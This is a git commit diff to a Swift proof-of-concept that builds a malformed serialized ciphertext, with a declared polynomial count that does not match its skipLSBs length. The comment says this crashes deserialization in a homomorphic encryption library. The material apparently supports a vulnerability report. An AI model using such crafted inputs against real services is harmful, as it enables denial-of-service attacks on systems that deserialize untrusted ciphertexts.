4b63677c12a9fb15429c808fbec38523e2348987
Salman <0daytrace@gmail.com>
2026-09-05 09:11:02 +0100

    Update main.swift

--- Sources/HE_PoC/main.swift
+++ Sources/HE_PoC/main.swift
@@ -1,65 +1,27 @@
 import Foundation
-
 import HomomorphicEncryption
 
-
-
 do {
-  
-    let params = try EncryptionParameters<Bfv<UInt64>>(from: .insecure_N_16_logQ_5_5)
-  
-    let context = try Context(encryptionParameters: params)
-  
+    // EncryptionParameters is generic over the Scalar type (e.g., UInt64)
+    let params = try EncryptionParameters<UInt64>(from: .insecure_N_16_logQ_5_5)
+    
+    // Context is generic over the Scheme (e.g., Bfv<UInt64>)
+    let context = try Context<Bfv<UInt64>>(encryptionParameters: params)
 
-  
     // polyCount = 2 (Little Endian: 0x02, 0x00)
-  
     let fakePolysBuffer: [UInt8] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
-  
-
-  
+    
     let maliciousSerialized = SerializedCiphertext<UInt64>.full(
-      
-        polys: fakePolysBuffer,
-      
+        polys: fakePolysBuffer, 
         skipLSBs: [0], // Length is 1, but polyCount is 2. This triggers the crash.
-      
         correctionFactor: 1
-      
     )
-  
 
-  
     let _ = try Ciphertext<Bfv<UInt64>, Coeff>(
-      
-        deserialize: maliciousSerialized,
-      
+        deserialize: maliciousSerialized, 
         context: context
-      
     )
-  
+    print("Unexpectedly succeeded")
 } catch {
-  
     print("Caught error: \(error)")
-  
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
